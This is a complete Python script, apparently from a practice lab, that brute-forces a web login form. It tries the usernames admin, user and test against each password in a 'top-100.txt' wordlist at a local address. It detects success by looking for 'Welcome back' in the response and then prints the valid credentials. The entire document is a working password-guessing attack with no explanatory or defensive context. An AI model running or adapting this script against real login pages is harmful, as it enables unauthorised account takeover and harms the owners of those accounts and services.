import requests
import sys

target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords_file = "top-100.txt"
needle = "Welcome back"

for username in usernames:
    with open(passwords_file, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting user:password -> {}:{}".format(username, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password})

            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
                sys.exit()

            sys.stdout.write("\r")
            sys.stdout.flush()

sys.stdout.write("\n")
sys.stdout.write("\t No Password found for any user!")
sys.stdout.write("\n")